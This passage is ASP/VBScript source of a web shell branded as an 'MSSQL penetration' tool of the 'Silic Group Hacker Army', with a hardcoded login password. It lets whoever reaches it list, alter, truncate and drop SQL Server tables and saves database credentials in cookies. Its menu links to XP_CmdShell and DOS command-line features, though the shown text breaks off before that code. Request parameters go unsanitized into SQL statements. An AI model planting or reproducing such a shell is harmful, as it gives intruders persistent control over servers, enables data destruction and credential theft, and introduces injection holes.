<%OPTION EXPLICIT%>
<%
Dim sTable, sField, sFieldname, sFieldType, sFieldLen, sRecordSet, sView, sSP, sDB
Dim Cookie_Login, Cookie_DbName, Cookie_DbUid, Cookie_DbPwd, Cookie_DbServer
Dim sAction, ServerIP, strPassword, intID, strScriptName,ThisPage
Dim maxdisplayedbin,maxdisplayedchar
Dim DbName, DbUid, DbPwd, DbServer,DbConnString,DbOwner
Dim sSQL, Rs, Conn, sSort, sOrder
Dim AppName,AppWeb
dim i, strmsg,FileCount
strPassword = "silic"
Cookie_Login = "Wyh_Login"
Cookie_DbName = "Wyh_DBName"
Cookie_DbUid = "Wyh_DBUid"
Cookie_DbPwd = "Wyh_DBPwd"
Cookie_DbServer = "Wyh_DBServer"
maxdisplayedbin = 16
maxdisplayedchar = 40
ServerIP = Request.ServerVariables("LOCAL_ADDR")
sAction = Trim(Request.QueryString("action"))
sDB = Trim(Request("db"))
sTable = Trim(Request("table"))
sField = Trim(Request("field"))
sView = Trim(Request("view"))
sSP = Trim(Request("sp"))
intID = Trim(Request("id"))
sSort = Trim(Request("sort"))
sOrder = Trim(Request("order"))
AppName = "MSSQL渗透"
AppWeb = "http://blackbap.org"
Function GetScriptName(n_Para)   
	dim strSN
	strSN = CStr(Request.ServerVariables("SCRIPT_NAME"))
	If Cint(n_Para) = 1 then
		If (Request.QueryString <> "") Then
		  strSN = strSN & "?" & Server.HTMLEncode(Request.QueryString)
		End If
	End If
	GetScriptName = strSN
End Function
Sub SetLoginCookie(sPwd)
	Response.Cookies(Cookie_Login) = sPwd
	Response.Cookies(Cookie_Login).Expires = Date
End Sub 
Function GetLoginCookie()
	if IsNull(Request.Cookies(Cookie_Login)) Or IsEmpty(Request.Cookies(Cookie_Login)) then
	    GetLoginCookie = ""
	else
		GetLoginCookie = Request.Cookies(Cookie_Login)
	end if
End Function
Sub SetDBCookie()
	Response.Cookies(Cookie_DbName) = DbName
	Response.Cookies(Cookie_DbUid) = DbUid
	Response.Cookies(Cookie_DbPwd) = DbPwd
	Response.Cookies(Cookie_DbServer) = DbServer
	Response.Cookies(Cookie_DbName).Expires = Date+1
	Response.Cookies(Cookie_DbUid).Expires = Date+1
	Response.Cookies(Cookie_DbPwd).Expires = Date+1
	Response.Cookies(Cookie_DbServer).Expires = Date+1
End Sub 
Sub GetDBCookie()
	DbName = Request.Cookies(Cookie_DbName)
	DbUid = Request.Cookies(Cookie_DbUid)
	DbPwd = Request.Cookies(Cookie_DbPwd)
	DbServer = Request.Cookies(Cookie_DbServer)
	DbConnString ="Provider=SQLOLEDB.1;Persist Security Info=False;Server="& DbServer &";User ID="& DbUid &";Password="& DbPwd &";Database="& DbName &";"
End Sub
Sub WriteLink(sParms,sDisplay,sBreak)
	dim ThisPage
	ThisPage = strScriptName
	response.Write("<A HREF=""" & ThisPage & sParms & """>" & sDisplay & "</A>" & sBreak & "")
End Sub
Sub LoginValidate()
	dim strUser, strPass
	strUser = Trim(Request.Form("UserName"))
	strPass = Trim(Request.Form("Password"))
	if strPass = strPassword then
	   Call SetLoginCookie(strPass)
	   Call ShowParentWindow
	else
	   ShowMessageBox("验证没有通过！")	   
	end if
End Sub
Sub LoginForm()
	Response.write ("<br><br><br>" & _
	  "<table width=""70%""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC""> " & _
	  "<form name=""loginform"" action=""?action=login"" method=""post"">" & _
	  "  <tr bgcolor=""#F1F1F1"">" & _
	  "    <td colspan=""2""><strong>用户登录</strong></td>" & _
	  "  </tr>" & _
	  "  <tr bgcolor=""#FFFFFF"">" & _
	  "    <td width=""19%"" nowrap>用户名称：</td>" & _
	  "    <td width=""81%""><input name=""UserName"" type=""text"" id=""UserName""></td>" & _
	  "  </tr>" & _
	  "  <tr bgcolor=""#FFFFFF"">" & _
	  "    <td nowrap>登录密码：</td>" & _
	  "    <td><input name=""Password"" type=""text"" id=""Password""></td>" & _
	  "  </tr>" & _
	  "  <tr bgcolor=""#FFFFFF"">" & _
	  "    <td colspan=""2""><input type=""submit"" name=""Submit"" value=""提交"">" & _
	  "   &nbsp;&nbsp;&nbsp;<input type=""reset"" name=""reset"" value=""重置"">" & _
	  "    </td>" & _
	  "  </tr>" & _
	  "</form>" & _
	  "</table>")   
End Sub
Sub DataSrcSetting()
	DbName = Trim(Request.Form("DbName"))
	DbUid = Trim(Request.Form("UID"))
	DbPwd = Trim(Request.Form("PWD"))
	DbServer = Trim(Request.Form("DBServer"))
	DbConnString = Trim(Request.Form("DBString"))
	if TRim(DbConnString) = "" then
		DbConnString ="Provider=SQLOLEDB.1;Persist Security Info=False;Server="& DbServer &";User ID="& DbUid &";Password="& DbPwd &";Database="& DbName &";"
	end if
	dim strMessage
	On Error Resume Next
	Set Conn = Server.CreateObject("ADODB.Connection")
	Conn.open(DbConnString)
	if err.number <> 0 then
	   strMessage = "数据源设定可能有错误，无法链接成功。"
	   strMessage = strMessage & "<br><br>错误描述：" & Err.description & "<br><br><br>"
	   strMessage = strMessage & "<a href=""?action=dbsrcbox"">返回重新设定</a>"
	   Set Conn = Nothing 
	else
	   Conn.close
	   Set Conn = Nothing   
	   strMessage = "数据源设定成功！"
	end if
	Call SetDBCookie
	Call ShowMessageBox(strMessage)
End Sub
Sub OpenDB()
	On Error Resume Next
	Call GetDBCookie
	Set Conn = Server.CreateObject("ADODB.Connection")
	Conn.open(DbConnString)
	if err.number <> 0 then
	   dim strMessage
	   strMessage = "数据源设定可能有错误，无法链接成功。"
	   strMessage = strMessage & "<br><br>错误描述：" & Err.description & "<br><br><br>"
	   strMessage = strMessage & "<a href=""?action=dbsrcbox"">返回重新设定</a>"
	   Set Conn = Nothing 
	   Call ShowMessageBox(strMessage)
	   exit sub 	   
	end if
	err.clear
	On Error Goto 0
End Sub
Sub CloseDB()
	If IsObject(RS) then
	   if Rs is nothing then
	   
	   else
		   if RS.state then RS.close
		   set RS = nothing
	   end if
	end if
	Conn.Close
	Set Conn = nothing
End Sub
Function rembracket(pStr)
	If pStr = "" Or IsNull(pStr) Then
		rembracket = ""
	Else
		rembracket = Replace(pStr, "]", "]]")
	End If
End Function
Function remquote(pStr)
	If pStr = "" Or IsNull(pStr) Then
		remquote = ""
	Else
		remquote = Replace(pStr, "'", "''")
	End If
End Function
Function bin2hex(pBin, pLen)
	Dim i, myL, myStr, myFlag
	myStr = "0x"
	If LenB(pBin) < pLen Then
		myL = LenB(pBin)
		myFlag = false
	Else
		myL = pLen
		myFlag = true
	End If
	For i = 1 To myL
		myStr = myStr & Hex(AscB(MidB(pBin, i, 1))) 
	Next
	bin2hex = Array(myStr, myFlag)
End Function
' ### txt2html : replaces vbCrlf by <BR> and vbTab by &nbsp;&nbsp;&nbsp;
Function txt2html(pStr)
	If pStr = "" Or IsNull(pStr) Then
		txt2html = ""
	Else
		txt2html = Replace(Replace(Replace(Server.HTMLEncode(pStr), vbCrlf, "<BR>"), vbTab, "&nbsp;&nbsp;&nbsp;"), "  ", "&nbsp;&nbsp;")
	End If
End Function
' ### getStrBegin : returns an array with the X first characters of the string and a boolean to know if the string has been cut
Function getStrBegin(pStr, pLength)
	Dim myC
	If pStr = "" Or IsNull(pStr) Then
		getStrBegin = Array("", false)
	ElseIf Len(pStr) <= pLength Then
		getStrBegin = Array(pStr, false)
	Else
		myC = InStr(pLength, pStr, " ")
		If myC > 0 Then getStrBegin = Array(Left(pStr, myC), true) Else getStrBegin = Array(pStr, false) End If
	End If
End Function
Function GetObjectText(sDB, pObjName)
	Dim myStrSQL, myArr, myRC, i, myTxt
	Conn.execute "USE [" & rembracket(sDB) & "];"
	myStrSQL = "SELECT c.text FROM syscomments c WHERE c.id = OBJECT_ID('" & (remquote(pObjName)) & "');"
	Set RS = Conn.execute(myStrSQL)
	if NOt rs.eof then
		myArr = RS.getRows
	else
		myArr = empty
	end if
	If isArray(myArr) Then myRC = UBound(myArr, 2) Else myRC = -1 End If
	myTxt = ""
	For i = 0 To myRC
		myTxt = myTxt & myArr(0, i)
	Next
	GetObjectText = myTxt
End Function
Sub DataSrcForm()
	Response.write ("<br><br><br>" & _
	 "<table width=""70%""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC"">" & _
	 "<form name=""dbform"" action=""?action=dbsrcset"" method=""post"">" & _
	 "<tr bgcolor=""#F1F1F1"">" & _
	 "<td colspan=""2""><strong>设定数据库链接</strong></td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td width=""19%"" nowrap>用户名称：</td>" & _
	 "<td width=""81%""><input name=""UID"" type=""text"" id=""UID""></td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td nowrap>登录密码：</td>" & _
	 "<td><input name=""PWD"" type=""text"" id=""PWD""></td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td nowrap>数据库名称：</td>" & _
	 "<td><input name=""DBName"" type=""text"" id=""DBName""></td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td nowrap>数据库服务器：</td>" & _
	 "<td><input name=""DBServer"" type=""text"" id=""DBServer"" value=""(local)""></td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td nowrap>自定义链接：</td>" & _
	 "<td><input name=""DBString"" type=""text"" size=""60""></td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td colspan=""2""><input type=""submit"" name=""Submit"" value=""提交"">"  & _
	 "&nbsp;&nbsp;&nbsp;<input type=""reset"" name=""reset"" value=""重置"">" & _
	 "</td>" & _
	 "</tr>" & _
	 "</form> " & _ 	  
	 "</table>")
End Sub
Sub ShowMessageBox(strmsg)
	Response.Write ("<br><br><br>" & _
	 "<table width=""80%""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC"">" & vbnewline & _
	 "  <tr bgcolor=""#F1F1F1""><td><strong>提示信息</strong></td></tr>" & vbnewline & _
	 "  <tr bgcolor=""#FFFFFF""><td><br><ul><span class=ErrText>"& strmsg &"</span></ul></td></tr>" & vbnewline & _ 
	 "</table>" & vbnewline & "")
	Call HtmlFooter
	Response.End
End Sub
Function GetFieldValue(i)
    if lcase(sAction) = "updaterec" then
        GetFieldValue = rs.fields(i).value
    else
        GetFieldValue = ""
    end if
End Function
Sub WriteType(I)
	Select Case Rs.Fields(i).type
	case 3 'primary key / auto number ?'
		if i=0 then
			response.Write "<input type=hidden name=id value=""" & intID & """>Auto Number (" & intID & ")"
		else
			response.Write "<input type=text name=" & Rs.Fields(i).name & " SIZE=50 value=""" & GetFieldValue(i) & """>"
		end if
	case 11 'boolean'
		response.Write "<INPUT TYPE=checkbox NAME="& Rs.Fields(i).name & " VALUE=""1""" & GetCheckValue(i) & ">"
	case 203 'memo'
		response.Write "<TEXTAREA NAME=" & Rs.Fields(i).name & " ROWS=20 COLS=56>" & GetFieldValue(i) & "</TEXTAREA>"
	case else 'not handled by this function'
		response.Write "<input type=text name=" & Rs.Fields(i).name & " SIZE=50 value=""" & GetFieldValue(i) & """>"
	End Select
End Sub
Sub HtmlHeader()
	Response.Write ("<HTML><HEAD>" & vbnewline & _
	 "<TITLE>"& AppName & " Silic Group Hacker Army " & AppWeb & " -- YoCo Smart " & ServerIP & "</TITLE>" & vbnewline & _
	 "<META http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">" & vbnewline & _
	 "<META NAME=""Author"" CONTENT=""Wang Yuheng"">" & vbnewline & _
	 "<META NAME=""Description"" CONTENT=""The SQL Server Web Online Editor"">" & vbnewline & _
	 "<style type=""text/css"">" & vbnewline & _
	 "<!--" & vbnewline	 & _
	 "body,td,th {font-family: Simsun, Arial, Helvetica, sans-serif;}" & vbnewline & _
	 "body { margin:0px 0px 0px 0px; line-height: 1.5;" & vbnewline )
	If sAction = "login" then Response.Write "overflow-x:hidden;overflow-y:hidden;"
	Response.Write ("word-break:break-all}" & vbnewline & _
	 "td { font-size: 14px;line-height: 1.5;}" & vbnewline & _
	 "A{color: #3366cc;text-decoration: none;}" & vbnewline & _
	 "A:hover{color: #ff6633;text-decoration: none;}" & vbnewline & _
	 ".ErrText{ font-weight:bold; color:#FF0000}" & vbnewline & _
	 ".menu a {color: #000000;text-decoration: none;font-size: 12px;}" & vbnewline & _
	 ".menu a:hover {color: #D6EDFF;text-decoration: none;font-size: 12px;}" & vbnewline & _
	 ".menutitle {border-bottom:1 solid #999999;border-top:2 solid #ffffff;border-right:1 solid #999999;font-weight: bold;background-color: F1F1F1;}" & vbnewline & _
	 ".menutitle2 {border-top:2 solid #ffffff;border-right:1 solid #999999;font-weight: bold;background-color: F1F1F1;}" & vbnewline & _
	 ".menubody {border-bottom:1 solid #999999;border-right:1 solid #999999;background-color: F1F1F1;}" & vbnewline & _
	 ".menubar {font-size: 12px;border-color: #F1F1F1;border-width: 1;border-style: solid;padding: 2 6 0 6;cursor: hand;}" & vbnewline & _
	 ".menubar a{color: #000000;}" & vbnewline & _
	 ".menubarover {font-size: 12px;background-color: #CCCCCC;border-color: #999999;border-width: 1;border-style: solid;padding: 2 6 0 6;cursor: hand;}" & vbnewline & _
	 ".menubarover a{color: #000000;}" & vbnewline & _
	 ".menubarover a:hover{color: #000000;}" & vbnewline & _
	 ".menubardown {font-size: 12px;background-color: #999999;border-color: #999999;border-width: 1;border-style: solid;padding: 2 6 0 6;cursor: hand;}" & vbnewline & _
	 ".menubardown a{color: #000000;}" & vbnewline & _
	 ".menubardown a:active{color: #000000;}" & vbnewline & _
	 ".menubaractive {font-size: 12px;background-color: #FCFCFC;border-color: #999999;border-width: 1;border-style: solid;padding: 2 6 0 6;cursor: default;}" & vbnewline & _
	 ".JJ {BORDER-RIGHT: #999999 1px solid; PADDING-RIGHT: 4px; BORDER-TOP: #999999 1px solid; OVERFLOW-Y: auto; OVERFLOW-X: auto; VERTICAL-ALIGN: top;PADDING-LEFT: 4px; PADDING-BOTTOM: 4px; BORDER-LEFT: #999999 1px solid; PADDING-TOP: 4px; WIDTH: 600px;BORDER-BOTTOM: #999999 1px solid; BACKGROUND-COLOR: #ffffff}" & vbnewline & _
	 ".resultbox{border-width: 0px;border-style: solid;border-color: threedshadow threedhighlight threedhighlight threedshadow;}" & _
	 ".resultheader{background: buttonface;overflow: scroll;font-family:Verdana,Arial;font-size:12px;height:16px;overflow: hidden;background: buttonface;border-width: 1px;border-style: solid;border-color: buttonhighlight buttonshadow buttonshadow buttonhighlight;}" & _
	 ".resultitem{font-family:Verdana,Arial;font-size:12px;border-style: solid;border-color: threedshadow;border-width: 0px 1px 1px 0px;height: 16px;white-space: nowrap;padding: 1px;}" & _
	 "-->" & vbnewline & _
	 "</style>" & vbnewline & _
	 "</HEAD>" & vbnewline & _
	 "<BODY>" & vbnewline)
End Sub
Sub ShowParentWindow
	Response.write ("<table width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0' bgcolor='menu'>" & _
	"<tr><td width='140'>" & _
	"<iframe name='leftFrame' src='?Action=leftmenu' width='100%' height='100%' frameborder='0' scrolling='no'></iframe></td>" & _
	"<td>" & _
	"<iframe name='mainFrame' src='?Action=mainwin' width='100%' height='100%' frameborder='0' scrolling='yes'></iframe>" & _
	"</td></tr></table>")
End Sub
Sub HtmlFooter()
  Response.Write("</BODY>" & vbnewline & "</HTML>")
End Sub
Sub ShowLeftMenu()
%>
<script language="javascript">
function OnPageLoad()
{
	function GetEventTD()
	{
		var e = event.srcElement;
		while(e != null)
		{
			className = e.className;
			if(className == 'menubar' || className == 'menubarover' || className == 'menubardown')
				break;
			e = e.parentElement;
		}
		return e;
	}
	function OnMenuOver()
	{
		var e = GetEventTD();
		if(e != null)e.className='menubarover';
	}
	function OnMenuOut()
	{
		var e = GetEventTD();
		if(e != null)e.className='menubar';
	}
	function OnMenuDown()
	{
		var e = GetEventTD();
		if(e != null)e.className='menubardown';
	}
	function OnMenuClick()
	{
		if(event.srcElement.tagName != "A")
		{
			var e = GetEventTD();
			if(e != null)
			{
				var LinkList = e.all.tags("a");
				if(LinkList.length > 0)LinkList[0].click();
			}
		}
	}
	function OnCancel()
	{
		return false;
	}
	var MenuBarList = document.all;
	for (i=0; i<MenuBarList.length; i++) 
		if(MenuBarList[i].className == "menubar")
		{
			var e = MenuBarList[i];
			var LinkList = e.all.tags("a");
			if(LinkList.length > 0 && (location.protocol + "//" + location.host + location.pathname).toLowerCase() == LinkList[0].href.toLowerCase())
			{
				MenuBarList[i].className = "menubaractive"
				e.innerHTML = e.innerText;
			}else
			{
				e.onmouseover = OnMenuOver;
				e.onmouseout = OnMenuOut;
				e.onmousedown = OnMenuDown;
				e.onmouseup = OnMenuOver;
				e.onclick = OnMenuClick;
			}
			e.onselectstart = OnCancel;
			e.ondragstart = OnCancel;
		}
}
onload = OnPageLoad;
</script>
<%
  Response.Write ("<table width=""100%"" id=""LeftMenu"" height=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"" align=""left"" >" & vbnewline & _
	"<tr><td valign=""top"" height=""100%"">" & vbnewline & _
	"  <table width=""100%"" height=""100%"" border=""0"" cellpadding=""6"" cellspacing=""0"">" & vbnewline & _
	"  <tr><td class=""menutitle"">数据库操作" & vbnewline & _
	"  <table width=""120"" border=""0"" cellpadding=""0"" cellspacing=""0"">" & vbnewline & _
	"  <tr><td class=""menubar""><a target=""mainFrame"" href=""?action=listtb"">资料表清单</a></td></tr>" & vbnewline & _
	"  <tr><td class=""menubar""><a target=""mainFrame"" href=""?action=listvw"">视图清单</a></td></tr>" & vbnewline & _
	"  <tr><td class=""menubar""><a target=""mainFrame"" href=""?action=listsp"">存储过程清单</a></td></tr>" & vbnewline & _
	"  <tr><td class=""menubar""><a target=""mainFrame"" href=""?action=listdb"">数据库清单</a></td></tr>  " & vbnewline & _
	"  <tr><td class=""menubar""><a target=""mainFrame"" href=""?action=execsql"">执行SQL语句</a></td></tr>" & vbnewline & _
	"  <tr><td class=""menubar""><a target=""mainFrame"" href=""?action=dbsrcbox"">重新设定数据源</a></td></tr>" & vbnewline & _
	"  </table>" & vbnewline & _
	"  </td></tr>" & vbnewline & _
	"<tr><td class=""menutitle"">文件操作" & vbnewline & _
	"  <table width=""120"" border=""0"" cellpadding=""0"" cellspacing=""0"">" & vbnewline & _
	"  <tr><td class=""menubar""><a target=""mainFrame"" href=""?action=searchfile"">文件搜索</a></td></tr>" & vbnewline & _
	"  </table></td></tr>" & vbnewline & _
	"<tr><td height=""100%"" valign=""top"" class=""menutitle"">扩展功能" & vbnewline & _
	"<table width=""120"" border=""0"" cellpadding=""0"" cellspacing=""0"">" & vbnewline & _
	"  <tr><td class=""menubar""><a target=""mainFrame"" href=""?action=xpcmdshell"">XP_CmdShell</a></td></tr>" & vbnewline & _
	"  <tr><td class=""menubar""><a target=""mainFrame"" href=""?action=cmdshell"">DOS命令行</a></td></tr>" & vbnewline & _
	"  </table></td></tr>" & vbnewline & _
	"</table></td></tr></table>" & vbnewline & "")
End Sub
Sub ShowMainWindow
 	Call DataSrcForm
End Sub
Sub ListDateType(sDefault)
	sSQL = "select name,length from systypes"
	Set Rs = Conn.execute(sSQL)
	if not Rs.eof then
		while not Rs.eof 
			response.Write "<option value="""& Rs(0) & """ " 
			if sDefault =  Rs(0) then response.Write("selected")
			response.Write ">"& Rs(0) &"</option>"
			rs.movenext
		Wend
	end if
End Sub
Sub ListTable()
	OpenDB
	if sSort = "" then sSort = "name"
	if sOrder = "" then sOrder = "asc"
	sSQL = "select sysobjects.id,sysobjects.name,sysobjects.category,sysusers.name,sysobjects.crdate "
	sSQL = sSQL & "from sysobjects join sysusers on sysobjects.uid = sysusers.uid "
	sSQL = sSQL & "where sysobjects.xtype = 'U' "
	sSQL = sSQL & "order by sysobjects."& sSort & " " & sOrder
	if sOrder = "asc" then sOrder = "desc" else sOrder = "asc"
	Set RS = Conn.execute(sSQL)
	dim myTblName
	Response.write ("<TABLE width=""98%"" BORDER=""0"" align=""center"" CELLPADDING=""3"" CELLSPACING=""1"" BGCOLOR=""#cccccc"">" & _
	"  <TR>" & _
	"	<TD width=""45%"" ALIGN=""Left"" bgcolor=""#F2F2F2""><strong><a href='?action=listtb&sort=name&order="&sOrder&"'>资料表名称</a></strong></TD>" & _
	"	<TD width=""13%"" ALIGN=""Left"" bgcolor=""#F2F2F2""><strong>所有者</strong></TD>" & _
	"	<TD width=""24%"" ALIGN=""Left"" bgcolor=""#F2F2F2""><strong><a href='?action=listtb&sort=crdate&order="&sOrder&"'>创建日期</a></strong></TD>" & _
	"	<TD width=""18%"" ALIGN=""center"" bgcolor=""#F2F2F2""><strong>操作</strong></TD>" & _
	"  </TR>")
	Do until RS.EOF
	myTblName = "[" & rembracket(DbName) & "].[" & rembracket(RS(3)) & "].[" & rembracket(RS(1)) & "]"
	Response.write ("  <TR bgcolor=""#FFFFFF"">" & _
	 "	<TD ALIGN=""Left""><a href='?action=listrec&table=" & myTblName & "'>" & RS(1) & "</a></TD>"  & _
	 "	<TD ALIGN=""Left"">" & RS(3) & "</TD>" & _
	 "	<TD ALIGN=""Left"">" & RS(4) & "</TD>" & _
	 "	<TD ALIGN=""center""><a href='?action=edittb&owner="& RS(3) &"&table=" & myTblName & "'>编辑</a>|" & _
	 "<a href='?action=cleartb&owner="& RS(3) &"&table=" & myTblName & "'>清除</a>|" & _
	 "<a href='?action=deletetb&owner="& RS(3) &"&table=" & myTblName & "'>删除</a>" & _
	 "	</TD>" & _
	 "  </TR>")
	RS.movenext
	Loop  
	Response.write "</TABLE>"
	CloseDB
End Sub
Sub EditTable   
	OpenDB
	sSQL = "select b.name,c.name,c.xtype,b.length,b.isnullable,b.colstat,case when b.autoval is null then 0 else 1 end,b.colid,a.id,d.text "
	sSQL = sSQL & "from sysobjects a "
	sSQL = sSQL & "join syscolumns b on a.id = b.id "
	sSQL = sSQL & "join systypes c on b.xtype = c.xtype and c.usertype <> 18 "
	sSQL = sSQL & "left join syscomments d on d.id = b.cdefault "
	sSQL = sSQL & "where a.id = OBJECT_ID('"& sTable &"') order by b.colid"
	Conn.execute "USE [" & DbName & "];"
	'response.Write(sSQL)
	Set RS = Conn.Execute(sSQL)
	Response.Write ("<BR>" & _
	 "<TABLE WIDTH=""90%"" BORDER=""0"" align=""center"" CELLPADDING=""4"" CELLSPACING=""1"" BGCOLOR=""#CCCCCC"">" & _
	 "<TR bgcolor=""#FFFFFF"">" & _
	 "<TD ALIGN=""Left"" colspan=""8"">" &sTable &"</TD>" & _
	 "</TR>" & _
	 "<TR bgcolor=""#FFFFFF"">" & _
	 "<TD ALIGN=""Left"" colspan=""8""><a href=""?action=addfield&table=" & sTable & """>添加新字段</a> | <a href='?action=listtb'>返回资料表清单</a> | <a href=""javascript:window.history.back()"">返回上页</a></TD>" & _
	 "</TR>" & _
	 "<TR bgcolor=""#F2F2F2"">" & _
	 "<TD ALIGN=""Left""><strong>字段名</strong></TD>" & _
	 "<TD ALIGN=""Left""><strong>数据类型</strong></TD>" & _
	 "<TD ALIGN=""Left""><strong>长度</strong></TD>" & _
	 "<TD ALIGN=""Left""><strong>允许空</strong></TD>" & _
	 "<TD ALIGN=""Left""><strong>标识列</strong></TD>" & _
	 "<TD ALIGN=""Left""><strong>默认值</strong></TD>" & _
	 "<TD ALIGN=""Left""><strong>删除</strong></TD>" & _
	 "<TD ALIGN=""Left""><strong>修改</strong></TD>" & _
	 "</TR>")
	Do until RS.EOF
	Response.Write ("<TR bgcolor=""#FFFFFF"">" & _
	 "<TD ALIGN=""Left"">" & RS(0) & "</TD>" & _
	 "<TD ALIGN=""Left"">" & RS(1) & " [" & RS(2) & "]</TD>" & _
	 "<TD ALIGN=""Left"">" & RS(3) & "</TD>" & _
	 "<TD ALIGN=""Left"">")
	if RS(4) = 0 then response.write ("False")  else response.write ("True")
	response.write "</TD><TD ALIGN=""Left"">"
	if RS(5) = 1 then response.write "ID."
	if RS(6) = 1 then response.write "(Auto)"
	Response.Write ("</TD>" & _
	 "<TD ALIGN=""Left"">" & RS(9) & "</TD>" & _
	 "<TD ALIGN=""Left""><a href='?action=deletefield&table=" & stable & "&field=" & RS(0) & "'>Delete</a></TD>" & _
	 "<TD ALIGN=""Left""><a href='?action=editfield&table=" & stable & "&field=" & RS(0) & "&id="&Rs(8)&"'>Edit #" & RS(7) & "</a></TD>" & _
	 "</TR>")
	Rs.movenext
	Loop
	Response.Write "</TABLE>"
	CloseDB
End Sub
Sub ClearTable
	if lcase(Request("confirm")) = "yes" then
		sTable = Trim(Request("table")) 
		if sTable = "" then
			Response.Write("没有选定资料表！")
		else
			on error resume next
			OpenDB
			Conn.Execute "Truncate Table " & sTable
			if err.number <> 0 then
				ShowMessageBox("清除时发生错误。<BR><BR>错误描述: " & Err.Description) 
			Else
				ShowMessageBox("成功清除资料表：" & sTable & "<BR><BR><a href='?action=listtb'>点击这里继续</a>") 
			end if
			CloseDB
		end if
	else
		strmsg = "清除前请确认...<BR><BR>"
		strmsg = strmsg & "<a href='?action=cleartb&confirm=yes&table=" & sTable & "'>Yes - 清除这个资料表</a><BR><BR>"
		strmsg = strmsg & "<a href='?action=listtb'>No - 不要清除这个资料表</a>"
		ShowMessageBox(strmsg)
	end if
End Sub
Sub DeleteTable
    if lcase(Request("confirm")) = "yes" then
		sTable = Trim(Request("table")) 
		if sTable = "" then
			Response.Write("没有输入资料表名称")
		else
			on error resume next
			OpenDB
			Conn.Execute "Drop Table " & sTable
			if err.number <> 0 then
				ShowMessageBox("删除时发生错误。<BR><BR>错误描述: " & Err.Description) 
			Else
				ShowMessageBox("成功删除资料表：" & sTable & "<BR><BR><a href='?action=listtb'>点击这里继续</a>") 
			end if
			err.clear
			CloseDB
		end if
	else
		strmsg = "删除前请确认...<BR><BR>"
		strmsg = strmsg & "<a href='?action=deletetb&confirm=yes&table=" & sTable & "'>Yes - 删除这个资料表</a><BR><BR>"
		strmsg = strmsg & "<a href='?action=listtb'>No - 不要删除这个资料表</a>"
		ShowMessageBox(strmsg)
	end if
End Sub
Sub EditField()
	OpenDB
	if sField <> "" then
		sSQL = "select b.name,a.length from syscolumns a "
		sSQL = sSQL & "join systypes b on a.xtype = b.xtype "
		sSQL = sSQL & "where a.id = '"&intID&"'and a.name = '"&sField&"'"
		set rs = conn.execute(sSQL)
		dim oldfield,oldlength
		oldfield = rs(0)
		oldlength = rs(1)
		rs.close
	end if
	Response.Write ("<br><br><br>" & _
	 "<TABLE width=""90%"" BORDER=""0"" CELLPADDING=""4"" CELLSPACING=""1"" bgcolor=""#CCCCCC"" align=""center"">" & _
	 "<FORM METHOD=""POST"" ACTION=""?action=savefield&table=" & sTable & """>" & _
	 "<TR bgcolor=""#F2F2F2"">" & _
	 "<TD colspan=""2""><strong>添加修改字段</strong></TD>" & _
	 "</TR>" & _
	 "<TR bgcolor=""#FFFFFF"">" & _
	 "<TD>字段名：</TD>" & _
	 "<TD><INPUT TYPE=""text"" NAME=""name"" SIZE=""30"" VALUE=""" & sField & """></TD>" & _
	 "</TR>" & _
	 "<TR bgcolor=""#FFFFFF"">" & _
	 "<TD>数据类型：</TD>" & _
	 "<TD><SELECT NAME=""type"" SIZE=""1"">	")
	ListDateType(oldfield)
	Response.Write ("</SELECT>" & _
	 "</TD>" & _
	 "</TR>" & _
	 "<TR bgcolor=""#FFFFFF"">" & _
	 "<TD>长度：</TD>" & _
	 "<TD><INPUT TYPE=""text"" NAME=""Length"" SIZE=""10"" VALUE="""& oldlength &"""> (for text fields - 1073741823 max)</TD>" & _
	 "</TR>" & _
	 "<TR bgcolor=""#FFFFFF"">" & _
	 "<TD colspan=""2""><input type=""submit"" value="" 确 定 "">" & _
	 "&nbsp;&nbsp;&nbsp;" & _
	 "<input name=""Reset"" type=""reset"" value="" 重 置 "">" & _
	 "&nbsp;&nbsp;&nbsp;" & _
	 "<input name=""Cancel"" type=""button"" value="" 取 消 "" onclick=""window.history.back()"">" & _
	 "<INPUT TYPE=""hidden"" NAME=""nameold"" SIZE=""30"" VALUE="""& sField &"""></TD>" & _
	 "</TR>" & _
	 "</FORM>"  & _
	 "</TABLE>")
	CloseDB
End Sub
Sub SaveField()
    sFieldname = trim(Request.Form("name"))    
    sFieldType = trim(Request.Form("type"))
	sFieldlen = trim(Request.Form("Length"))
    if trim(Request.Form("nameold")) = "" then
        sSQL = "alter table " & sTable & " add " & sFieldname & " "
    else
        sSQL = "alter table " & sTable & " alter column " & sFieldname & " "
    end if
    sSQL = sSQL & sFieldType 
	if sFieldlen <> "" then
	sSQL = sSQL & "(" & sFieldlen & ") Null"
	else
	sSQL = sSQL & " Null"
	end if
    
    on error resume next
	OpenDB
    Conn.Execute sSQL
	if err.number <> 0 then
		ShowMessageBox("保存字段资料时发生错误。<BR><BR>错误描述: " & Err.Description) 
	Else
		ShowMessageBox("成功保存字段资料：" & sFieldname & "<BR><BR><a href='?action=listtb'>点击这里继续</a>") 
	end if
	CloseDB
End Sub
Sub DeleteField
	if lcase(Request("confirm")) = "yes" then
		sTable = Trim(Request("table")) 
		sField = Trim(Request("field"))
	    if sTable = "" or sField = "" then
    		Response.Write("没有输入字段名称")
	    else
		    on error resume next
			OpenDB
	        Conn.Execute "alter table " & sTable & " drop column " & sField
			if err.number <> 0 then
				ShowMessageBox("删除字段时发生错误。<BR><BR>错误描述: " & Err.Description) 
			Else
				ShowMessageBox("成功删除字段：" & sTable & "." & sField & "<BR><BR><a href='?action=edittb&table="& sTable &"'>点击这里继续</a>") 
			end if
			err.clear
			CloseDB
		end if
	else
		strmsg = "删除前请确认...<BR><BR>"
